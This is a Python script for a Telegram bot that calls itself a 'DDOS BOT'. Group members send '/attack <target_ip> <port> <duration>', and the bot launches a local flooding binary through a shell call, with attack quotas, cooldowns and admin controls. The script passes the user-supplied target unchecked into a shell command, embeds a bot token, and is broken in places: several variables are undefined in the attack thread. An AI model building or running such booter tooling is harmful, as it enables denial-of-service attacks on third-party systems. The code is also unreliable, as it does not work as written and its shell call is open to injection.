#!/usr/bin/python3
import telebot
import datetime
import time
import subprocess
import random
import aiohttp
import threading
import random
# Insert your Telegram bot token here
bot = telebot.TeleBot('7330439352:AAGe4akhUf57yi6wNDRCl44IRoot4ehq3cc')


# Admin user IDs
admin_id = ["6005957043"]

# Group and channel details
GROUP_ID = "-1002399798592"
CHANNEL_USERNAME = "@sharma"

# Default cooldown and attack limits
COOLDOWN_TIME = 30  # Cooldown in seconds
ATTACK_LIMIT = 10  # Max attacks per day
global_pending_attack = None
global_last_attack_time = None
pending_feedback = {}  # यूजर 

# Files to store user data
USER_FILE = "users.txt"

# Dictionary to store user states
user_data = {}
global_last_attack_time = None  # Global cooldown tracker

# 🎯 Random Image URLs  
image_urls = [
    
]

def is_user_in_channel(user_id):
    return True  # **यहीं पर Telegram API से चेक कर सकते हो**
# Function to load user data from the file
def load_users():
    try:
        with open(USER_FILE, "r") as file:
            for line in file:
                user_id, attacks, last_reset = line.strip().split(',')
                user_data[user_id] = {
                    'attacks': int(attacks),
                    'last_reset': datetime.datetime.fromisoformat(last_reset),
                    'last_attack': None
                }
    except FileNotFoundError:
        pass

# Function to save user data to the file
def save_users():
    with open(USER_FILE, "w") as file:
        for user_id, data in user_data.items():
            file.write(f"{user_id},{data['attacks']},{data['last_reset'].isoformat()}\n")

# Middleware to ensure users are joined to the channel
def is_user_in_channel(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

pending_feedback = {}  # यूजर की स्क्रीनशॉट वेटिंग स्टेट स्टोर करने के लिए


# Command to handle attack
@bot.message_handler(commands=['attack'])
def handle_attack(message):
    global global_last_attack_time, global_pending_attack

    user_id = str(message.from_user.id)
    user_name = message.from_user.first_name
    command = message.text.split()

    if message.chat.id != int(GROUP_ID):
        bot.reply_to(message, f"🚫 **𝐓𝐡𝐢𝐬 𝐛𝐨𝐭 𝐜𝐚𝐧 𝐨𝐧𝐥𝐲 𝐛𝐞 𝐮𝐬𝐞𝐝 𝐢𝐧 𝐭𝐡𝐞 𝐠𝐫𝐨𝐮𝐩!** ❌")
        return

    if not is_user_in_channel(user_id):
        bot.reply_to(message, f"❗ **𝐏𝐥𝐞𝐚𝐬𝐞 𝐣𝐨𝐢𝐧 𝐭𝐡𝐞 𝐜𝐡𝐚𝐧𝐧𝐞𝐥 𝐟𝐢𝐫𝐬𝐭!**")
        return

    if pending_feedback.get(user_id, False):
        bot.reply_to(message, "😡 **𝐒𝐂𝐑𝐄𝐄𝐍𝐒𝐇𝐎𝐓 𝐃𝐄𝐏𝐇𝐀𝐇𝐋𝐄!** 🔥")
        return

    if global_pending_attack:
        bot.reply_to(message, "⚠️ **𝐀𝐧𝐨𝐭𝐡𝐞𝐫 𝐚𝐭𝐭𝐚𝐜𝐤 𝐢𝐬 𝐛𝐞𝐢𝐧𝐠 𝐞𝐱𝐞𝐜𝐮𝐭𝐞𝐝!**")
        return

    # Check cooldown
    if user_id not in user_data:
        user_data[user_id] = {'attacks': 0, 'last_reset': datetime.datetime.now(), 'last_attack': None}

    user = user_data[user_id]
    if user['attacks'] >= ATTACK_LIMIT:
        bot.reply_to(message, f"❌ **𝐀𝐭𝐭𝐚𝐜𝐤 𝐥𝐢𝐦𝐢𝐭 𝐞𝐱𝐩𝐢𝐫𝐞𝐝!**")
        return

    if len(command) != 4:
        bot.reply_to(message, "⚠️ **𝐔𝐬𝐞𝐫 𝐬𝐭𝐲𝐥𝐞**: `/attack <target_ip> <port> <duration>`")
        return

    target, port, time_duration = command[1], command[2], command[3]

    try:
        port = int(port)
        time_duration = int(time_duration)
    except ValueError:
        bot.reply_to(message, "❌ **𝐄𝐫𝐫𝐨𝐫:** 𝐏𝐨𝐫𝐭 𝐚𝐧𝐝 𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧 𝐦𝐮𝐬𝐭 𝐛𝐞 𝐢𝐧 𝐢𝐧𝐭𝐞𝐠𝐞𝐫𝐬!")
        return

    # Execute attack command
    full_command = f"./Rahul {target} {port} {time_duration} 700"

    remaining_attacks = ATTACK_LIMIT - user['attacks'] - 1
    random_image = random.choice(image_urls)  # Select a random image URL

    bot.send_photo(message.chat.id, random_image, 
                   caption=f"💥 **𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃!** 💥")

    pending_feedback[user_id] = True  
    global_pending_attack = user_id  

    # Start attack and manage countdown
    threading.Thread(target=manage_attack, args=(message, user_name, target, port, time_duration, remaining_attacks)).start()

def manage_attack(message, user_name, target, port, time_duration, remaining_attacks):
    global global_last_attack_time, global_pending_attack

    # Attack power-on
    bot.send_message(message.chat.id, f"⚡ **𝐀𝐭𝐭𝐚𝐜𝐤 𝐢𝐧 𝐩𝐫𝐨𝐠𝐫𝐞𝐬𝐬!**")

    try:
        subprocess.run(full_command, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        bot.reply_to(message, f"❌ **𝐄𝐫𝐫𝐨𝐫:** {e}")
        global_pending_attack = None
        pending_feedback[user_id] = False
        return

    # Countdown before attack finishes
    for i in range(5, 0, -1):
        bot.send_message(message.chat.id, f"⏳ **𝐓𝐢𝐦𝐞𝐫:** {i} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬 𝐫𝐞𝐦𝐚𝐢𝐧𝐢𝐧𝐠!")
        time.sleep(1)

    # Attack completed
    bot.send_message(message.chat.id, 
                     f"✅ **𝐀𝐓𝐓𝐀𝐂𝐊 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄𝐃!**")

    global_last_attack_time = datetime.datetime.now()
    user_data[user_id]['attacks'] += 1
    save_users()

    # Start cooldown for the user
    threading.Thread(target=cooldown_timer, args=(message, user_id)).start()

    global_pending_attack = None

def cooldown_timer(message, user_id):
    cooldown_end_time = datetime.datetime.now() + datetime.timedelta(seconds=COOLDOWN_TIME)
    while datetime.datetime.now() < cooldown_end_time:
        remaining_cooldown = (cooldown_end_time - datetime.datetime.now()).seconds
        bot.send_message(message.chat.id, f"⏳ **𝐂𝐨𝐨𝐥𝐝𝐨𝐰𝐧 𝐬𝐭𝐚𝐫𝐭𝐞𝐝:** {remaining_cooldown}𝙨")
        time.sleep(1)

    bot.send_message(message.chat.id, "🚀 **𝐂𝐨𝐨𝐥𝐝𝐨𝐰𝐧 𝐨𝐯𝐞𝐫! 𝐍𝐞𝐱𝐭 /attack 𝐫𝐞𝐚𝐝𝐲!**")

# Command to check remaining attacks for a user
@bot.message_handler(commands=['check_remaining_attack'])
def check_remaining_attack(message):
    user_id = str(message.from_user.id)
    if user_id not in user_data:
        bot.reply_to(message, f"You have {ATTACK_LIMIT} attacks remaining for today.")
    else:
        remaining_attacks = ATTACK_LIMIT - user_data[user_id]['attacks']
        bot.reply_to(message, f"You have {remaining_attacks} attacks remaining for today.")

# Admin commands
@bot.message_handler(commands=['reset'])
def reset_user(message):
    if str(message.from_user.id) not in admin_id:
        bot.reply_to(message, "Only admins can use this command.")
        return

    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "Usage: /reset <user_id>")
        return

    user_id = command[1]
    if user_id in user_data:
        user_data[user_id]['attacks'] = 0
        save_users()
        bot.reply_to(message, f"Attack limit for user {user_id} has been reset.")
    else:
        bot.reply_to(message, f"No data found for user {user_id}.")

@bot.message_handler(commands=['setcooldown'])
def set_cooldown(message):
    if str(message.from_user.id) not in admin_id:
        bot.reply_to(message, "Only admins can use this command.")
        return

    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "Usage: /setcooldown <seconds>")
        return

    global COOLDOWN_TIME
    try:
        COOLDOWN_TIME = int(command[1])
        bot.reply_to(message, f"Cooldown time has been set to {COOLDOWN_TIME} seconds.")
    except ValueError:
        bot.reply_to(message, "Please provide a valid number of seconds.")

@bot.message_handler(commands=['viewusers'])
def view_users(message):
    if str(message.from_user.id) not in admin_id:
        bot.reply_to(message, "Only admins can use this command.")
        return

    user_list = "\n".join([f"User ID: {user_id}, Attacks Used: {data['attacks']}, Remaining: {ATTACK_LIMIT - data['attacks']}" 
                           for user_id, data in user_data.items()])
    bot.reply_to(message, f"User Summary:\n\n{user_list}")
    

# 📸 **𝐒𝐂𝐑𝐄𝐄𝐍𝐒𝐇𝐎𝐓 𝐂𝐇𝐄𝐂𝐊𝐄𝐑** 📸
@bot.message_handler(content_types=['photo'])
def handle_screenshot(message):
    user_id = str(message.from_user.id)
    
    if pending_feedback.get(user_id, False):
        bot.reply_to(message, "✅ **𝐓𝐇𝐀𝐍𝐊𝐒, 𝐍𝐄𝐗𝐓 𝐀𝐓𝐓𝐀𝐂𝐊 𝐑𝐄𝐀𝐃𝐘!** 💥")
        pending_feedback[user_id] = False  
    else:
        bot.reply_to(message, "❌ **𝐘𝐎𝐔 𝐃𝐎𝐍'𝐓 𝐍𝐄𝐄𝐃 𝐓𝐎 𝐆𝐈𝐕𝐄 𝐒𝐂𝐑𝐄𝐄𝐍𝐒𝐇𝐎𝐓 𝐍𝐎𝐖!**")

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f"""🌟🔥 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐁𝐑𝐎 {user_name} 🔥🌟
    
🚀 **𝐘𝐨𝐮'𝐫𝐞 𝐢𝐧 𝐓𝐡𝐞 𝐇𝐎𝐌𝐄 𝐨𝐟 𝐏𝐎𝐖𝐄𝐑!**  
💥 𝐓𝐡𝐞 𝐖𝐎𝐑𝐋𝐃'𝐒 𝐁𝐄𝐒𝐓 **DDOS BOT** 🔥  
⚡ 𝐁𝐄 𝐓𝐇𝐄 𝐊𝐈𝐍𝐆, 𝐃𝐎𝐌𝐈𝐍𝐀𝐓𝐄 𝐓𝐇𝐄 𝐖𝐄𝐁!  

🔗 **𝐓𝐨 𝐔𝐬𝐞 𝐓𝐡𝐢𝐬 𝐁𝐨𝐭, 𝐉𝐨𝐢𝐧 𝐍𝐨𝐰:**  
👉 [𝙏𝙚𝙡𝙚𝙜𝙧𝙖𝙢 𝙂𝙧𝙤𝙪𝙥](https://t.me/+ZPo210hJV2YwZDhl) 🚀🔥"""
    
    bot.reply_to(message, response, parse_mode="Markdown")
# Function to reset daily limits automatically
def auto_reset():
    while True:
        now = datetime.datetime.now()
        seconds_until_midnight = ((24 - now.hour - 1) * 3600) + ((60 - now.minute - 1) * 60) + (60 - now.second)
        time.sleep(seconds_until_midnight)
        for user_id in user_data:
            user_data[user_id]['attacks'] = 0
            user_data[user_id]['last_reset'] = datetime.datetime.now()
        save_users()

# Start auto-reset in a separate thread
reset_thread = threading.Thread(target=auto_reset, daemon=True)
reset_thread.start()

# Load user data on startup
load_users()


#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
        # Add a small delay to avoid rapid looping in case of persistent errors
        time.sleep(15)
        
        
 

